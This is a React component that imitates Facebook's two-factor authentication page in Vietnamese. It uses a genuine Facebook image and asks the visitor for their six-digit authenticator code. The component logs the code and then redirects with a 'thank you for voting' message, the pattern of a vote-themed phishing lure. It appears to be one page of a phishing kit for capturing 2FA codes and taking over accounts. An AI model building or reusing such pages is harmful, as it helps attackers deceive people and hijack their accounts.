/* eslint-disable @typescript-eslint/no-explicit-any */
import { useState, useCallback, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

const Facebook2FAScreen = () => {
  const [code, setCode] = useState('');
  const [isButtonEnabled, setIsButtonEnabled] = useState(false);
  const nav = useNavigate();

  const handleCodeChange = useCallback((e: any) => {
    const value = e.target.value;
    if (/^\d*$/.test(value)) {
      setCode(value);
    }
  }, []);

  useEffect(() => {
    setIsButtonEnabled(code.length === 6);
  }, [code]);

  const handleContinue = useCallback(() => {
    console.log('Mã xác thực:', code);
    setTimeout(() => {
      nav('/', { state: { message: 'Cảm ơn bạn đã bình chọn' } });
    }, 4000);
  }, [code, nav]);



  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-100 py-6">
      <div className="w-full max-w-md mx-auto">
        {/* Main Content */}
        <p className="text-[12px] font-medium text-gray-500">Deante Laroyce • Facebook</p>

        <div className="mb-4 ">
          <h1 className="text-2xl font-bold text-gray-900">Đi đến ứng dụng xác thực</h1>
          <p className="mt-2 text-sm text-gray-700">
            Nhập mã gồm 6 chữ số cho tài khoản này từ ứng dụng xác thực 2 yếu tố mà bạn đã thiết lập (ví dụ: Duo Mobile hoặc Google Authenticator).
          </p>
        </div>

        <div className="mb-6">
          <img
            src="https://static.xx.fbcdn.net/rsrc.php/v4/y4/r/N3dO4_SJQPQ.png"
            alt="2FA Instruction"
            className="w-full rounded-lg"
          />
        </div>

        <div className="bg-white rounded-[10px]  overflow-hidden mb-4">
          <input
            type="text"
            placeholder="Mã"
            className="w-full px-4 py-3 pr-10 rounded-[10px] border border-gray-300 text-gray-600 focus:outline-none "
            value={code}
            onChange={handleCodeChange}
            maxLength={6}
          />
        </div>

        <button
          onClick={handleContinue}
          className={`cursor-pointer w-full py-3 rounded-full font-medium text-white mb-3 ${isButtonEnabled ? 'bg-blue-500' : 'bg-blue-300'}`}
          disabled={!isButtonEnabled}
        >
          Tiếp tục
        </button>

        <button
          className="cursor-pointer w-full py-3 rounded-full font-medium text-gray-700 border border-gray-300 bg-white"
        >
          Thử cách khác
        </button>
      </div>


    </div>
  );
};

export default Facebook2FAScreen;
